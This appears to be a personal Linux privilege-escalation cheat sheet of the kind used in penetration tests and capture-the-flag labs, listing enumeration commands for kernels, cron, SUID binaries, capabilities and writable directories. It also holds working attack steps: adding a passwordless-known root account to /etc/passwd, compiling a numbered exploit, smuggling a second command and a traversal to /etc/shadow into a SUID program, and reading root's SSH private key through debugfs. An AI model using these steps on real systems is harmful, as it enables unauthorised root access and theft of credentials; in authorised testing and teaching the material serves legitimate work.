#!/usr/bin/peno

# Getting the version of the running operating system and architecture
cat /etc/issue
cat /etc/*-release
uname -a

#Enumerate IP-Adresses
cat /etc/sysconfig/network-scripts/ifcfg-eth0 | grep IP

#Getting a list of running processes on Linux
ps axu

#Inspecting the cron log file
grep "CRON" /var/log/cron.log

#Listing the full TCP/IP configuration on all available adapters on Linux
ip a

#Printing the routes on Linux
/sbin/route

#checking the writable permissions on /etc/apt/apt.conf.d
ls -ld /etc/apt/apt.conf.d


#Listing all active network connections on Linux
ss -anp


#Writable Directory
find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \; 2>/dev/null


#discovering that this user can write to usr/local/bin.
find / -writable -type d -prune -o -name /home/chloe -prune -o -name /var/lib/gitea 2>/dev/null

# Listing all cron jobs on Linux
ls -lah /etc/cron*
cat /etc/crontab

# Listing all installed packages on a Debian Linux operating system
dpkg -l

#Listing all world writable directories on Linux
find / -writable -type d 2>/dev/null

#Caps
getcap -r / 2>/dev/null

#Listing content of /etc/fstab and all mounted drives on Linux
cat /etc/fstab
mount

#Listing all available drives using lsblk on Linux
/bin/lsblk

#Listing loaded drivers on Linux
lsmod

#Listing additional information about a module on Linux
/sbin/modinfo libata

# Searching for SUID files on Linux
find / -perm -u=s -type f 2>/dev/null
find / -type f -perm -4200 2>/dev/null

#Tools
#https://pentestmonkey.net/tools/audit/unix-privesc-check
./unix-privesc-check standard > output.txt

#Escalating privileges by editing /etc/passwd
openssl passwd evil -->Output: AK24fcSx2Il3I
echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2 --> Root

#Code-GCC Compile
gcc 43418.c -o exploit

#Process monitoring
https://github.com/DominicBreuker/pspy/releases

#Dumping Firefox Saved Passwords
find / -type f -user elliot 2>/dev/null | grep -v "/proc/" | grep -v "/sys/"

#SUID example
$ ./get-list
Which List do you want to open? [customers/employees]: employees;ls
$ ./get-list
Which List do you want to open? [customers/employees]: ../../etc/shadow #employees

#df Example

$ id
uid=1002(sysadmin) gid=1002(sysadmin) groups=1002(sysadmin),6(disk)
$ df -h
udev            1.9G     0  1.9G   0% /dev
tmpfs           390M  1.9M  388M   1% /run
/dev/sda5        20G  7.8G   11G  43% /

$ debugfs /dev/sda5
debugfs:  cd /root/.ssh
debugfs:  cat id_rsa
